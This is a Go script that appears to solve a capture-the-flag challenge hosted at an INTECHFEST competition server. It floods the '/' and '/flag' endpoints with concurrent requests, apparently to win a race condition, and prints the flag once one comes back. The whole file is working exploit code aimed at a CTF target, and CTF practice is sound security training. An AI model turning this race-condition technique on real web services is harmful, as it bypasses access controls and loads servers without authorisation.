package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

var url = "http://ctf.intechfest.cc:32768"

func main() {
	limiter1 := make(chan struct{}, 64)
	limiter2 := make(chan struct{}, 32)
	go func() {
		for {
			limiter1 <- struct{}{}
			go func() {
				if SendSlash() {
					os.Exit(0)
				}
			}()
			<-limiter1
			limiter1 <- struct{}{}
			go func() {
				if SendSlash() {
					os.Exit(0)
				}
			}()
			<-limiter1
			<-limiter2
		}
	}()
	var i = 0
	go func() {
		for {
			limiter2 <- struct{}{}
			i++
			fmt.Println("try", i)
			go func() {
				if SendFlag() {
					os.Exit(0)
				}
			}()
		}
	}()
	select {}
}

func SendSlash() bool {
	get, err := http.Get(url + "/")
	if err != nil {
		log.Println(err)
	}
	if get != nil {
		defer get.Body.Close()
		return checkBody(get.Body)
	}
	return false
}

func SendFlag() bool {
	get, err := http.Get(url + "/flag")
	if err != nil {
		log.Println(err)
	}
	if get != nil {
		defer get.Body.Close()
		return checkBody(get.Body)
	}
	return false
}

func checkBody(rd io.Reader) bool {
	data, _ := io.ReadAll(rd)
	if data == nil {
		return false
	}
	if strings.Contains(string(data), "INTECHFEST") {
		fmt.Println(string(data))
		return true
	}
	return false
}
